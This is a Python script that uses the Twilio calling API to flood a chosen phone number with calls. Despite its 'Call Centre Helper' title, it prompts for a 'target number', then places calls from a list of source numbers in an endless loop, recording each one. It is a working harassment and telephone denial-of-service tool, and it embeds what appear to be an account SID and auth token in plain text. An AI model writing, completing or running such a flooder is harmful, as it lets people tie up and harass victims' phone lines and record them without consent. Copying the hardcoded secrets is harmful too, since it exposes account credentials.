import time
# NOTE: This requires python 3 and the twilio library to be installed (pip install twilio)
from twilio.rest import Client

#replcae with ur account SID and auth
accountSid = "AC76489473c25a023b2704b7323b4ba6ad02" 
authtoken = "cc862f93fd99acfaed09f08a249db6bc1"

#replace with your WAV or MP3 file
voiceml = "https://cornsilk-serval-5625.twil.io/assets/dbf349a2-88a9-4784-ad45-e225416732c1.wav"

# Replace these with phone numbers.
sourceNumbers = ["+10000000000", "+10000000001", "+10000000002", "+10000000003"]

def callThem(toNumber, fromNumber):
    try:
        call = client.calls.create(
            to=toNumber,
            from_=fromNumber,
            record=True,  #record the call
            url=voiceml,
            method="GET",
        )
        print(f"Started call to {toNumber} from {fromNumber}")
    except Exception as err:
        print(f"Error on  {toNumber} from {fromNumber}: {err}")


print(r"""Call Centre Helper""")

numToCall = input("Enter the target number to start flood (country code must be at the start): ")
input("Press ENTER to start the flooder, Otherwise exit the application right now...")

client = Client(accountSid, authtoken)

count = 0
while True:
    count += 1
    print(f"Starting call batch {count} [{len(sourceNumbers)} Nums.]")
    for sourceNumber in sourceNumbers:
        callThem(numToCall, sourceNumber)
        time.sleep(1)
        time.sleep(4)
